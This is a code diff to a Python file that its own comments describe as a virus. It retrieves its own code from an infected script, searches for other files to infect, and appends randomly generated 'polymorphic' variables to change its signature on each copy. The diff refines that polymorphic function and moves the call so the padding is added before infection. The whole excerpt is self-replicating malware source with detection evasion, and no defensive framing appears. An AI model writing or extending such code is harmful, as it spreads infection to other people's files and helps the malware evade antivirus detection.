@@ -77,12 +77,12 @@ def write_execution_count(count):
 
 
 def generate_polymorphic_code():
-    variables = []
+    variables = [ ]
 
     for _ in range(10):
-        variable_name = ''.join(random.choices(string.ascii_letters)for _ in range(10))
-        variable_value= ''.join(random.choices(string.ascii_letters)for _ in range(150))
-        variables.append(f"{variable_name} = '{variable_value}'")
+        variable_name = ''.join(random.choices(string.ascii_letters, k=10))
+        variable_value = ''.join(random.choices(string.ascii_letters, k=10))
+        variables.append(f'{variable_name} = "{variable_value}"\n')
 
     return variables
 
@@ -97,6 +97,7 @@ try:
 
     # retrieve the virus code from the current infected script
     virus_code = get_virus_code()
+    virus_code.extend(generate_polymorphic_code())
 
     # look for other files to infect
     for file in find_files_to_infect():
@@ -110,8 +111,6 @@ try:
 #     pass
 
 finally:
-    
-    virus_code.extend(generate_polymorphic_code())
 
     # delete used names from memory
     for i in list(globals().keys()):
